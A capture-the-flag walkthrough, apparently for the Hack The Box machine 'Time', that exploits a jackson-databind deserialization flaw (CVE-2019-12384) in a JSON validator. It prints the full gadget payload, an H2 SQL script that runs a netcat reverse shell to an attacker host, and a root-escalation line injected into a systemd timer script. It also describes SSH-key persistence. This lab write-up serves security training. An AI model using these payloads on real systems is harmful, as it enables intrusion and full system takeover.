## Enumeration

We start with the enumeration of published services using a `nmap` quick scan, where we can see the output below:

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.214
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 16:08 -03

### 80/TCP - HTTP Service

Starting by checking the HTTP service published on port 80, noticed that we have a JSON Validation and Beautifier service.

After some enumeration with `whatweb` and `nikto` I haven't found anything useful, so I proceeded to app experimentation, looking for some vulnerability that could lead us to some code injection or LFI.

Analyzing the application, we have two functionalities: **Beautify** and **Validate**:

- The option beautify, after receiving a valid JSON, formats it in a pretty manner and, sending an invalid content (e.g. "test"), returns a `null` value.

![image-20210227103837978](https://i.imgur.com/gwqqcNt.png){: .align-center}

- The Validate option (in beta) checks the syntax of the JSON provided. When we send an invalid request (e.g. "test"), the exception below is returned.

  ```output
  Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'test': was expecting 'null', 'true', 'false' or NaN
  ```

## Initial Access

After searching for `com.fasterxml.jackson.core` I have found about **Jackson** project, developed by **FasterXML** and from which core is the base component for [jackson-databind](https://github.com/FasterXML/jackson-databind), a popular JSON library, here used to implement the formatting and validating features.

Looking for CVEs on jackson-databind, I have found the following for code execution published in 2019, according to the page [CVE Details](https://www.cvedetails.com):

![image-20210227112026175](https://i.imgur.com/ju87o1J.png){: .align-center}

Of the 4 listed, I have found for **CVE-2019-12384** a working PoC at [this blog](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html), which I have used to gain initial access to the box. The following steps were used to get a reverse shell:

- Created a file called `inject.sql` with the code below, modified from the version at the blog, to start a reverse shell to the attacker machine at 4443 and published using a python3 HTTP server (`sudo python3 -m http.server 80`) from the directory where the file resides.

  ```sql
  CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
      String[] command = {"bash", "-c", cmd};
      java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
      return s.hasNext() ? s.next() : "";  }
  $$;
  CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f')
  ```

- Configured listener using netcat by running `nc -lnvp 4443`.
- Sent payload below in the application instead of a JSON content to be validated.

  ```output
  ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.10.10/inject.sql'"}]
  ```

## User flag

After upgrading the shell, started enumeration where was identified that the user we were using, **pericles**, was a regular Linux user with no special permissions granted.

```bash
pericles@time:/var/www/html$ id
uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
```

Acessing its root directory found the user flag, as below.

```bash
pericles@time:/var/www/html$ cd ~
pericles@time:/home/pericles$ cat user.txt 
<redacted>
pericles@time:/home/pericles$ 
```

## Root flag

Before continuing enumeration, to make easier regaining access if needed, created a SSH key using `ssh-keygen` and configured the public key in the file `~/.ssh/authorized_keys`, allowing us to directly connect to the user pericles via SSH.

The enumeration was done by running `linpeas.sh` and one of the findings called attention, referring to the machine name: a shell file owned by `pericles` in the path `/usr/bin/timer_backup.sh`.

This file is configured as a **system timer** (`/etc/systemd/system/timer_backup.timer` and `/etc/systemd/system/timer_backup.service`) and set be executed **every 10 seconds** as `root`.

As we have enough permissions to edit the shell script, I have added the line below to return a reverse shell on the attacker machine and, after a few seconds, a reverse shell was obtained! :smile:

```bash
rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/g
```

As the process is re-executed every 10 sec the process tree is terminated, and we lose the existing connection to the machine. To just get the root flag this time is sufficient, which was as done initially.

```bash
$ nc -lnvp 4443
listening on [any] 4443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.214] 33304
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
<redacted>
#      
```

In case you want to get a persistent connection at this machine we have two initial options:

- Configure the system timer to add the public key in the `/root/.ssh/authorized_keys` file, allowing us to SSH as `root`.
- Spawn another reverse shell as soon as we get the initial connection, which can be done in multiple ways like Metasploit AutoRunScript and `netcat`, prepending the listener with the instruction to send the payload as soon as it gets connected, as you can see an example below where the `id` command is executed as soon as the session is started:

```bash
printf "id\n" | nc -lnvp 4443
```

I hope this was useful to you and see you guys in the next post! :smiley:
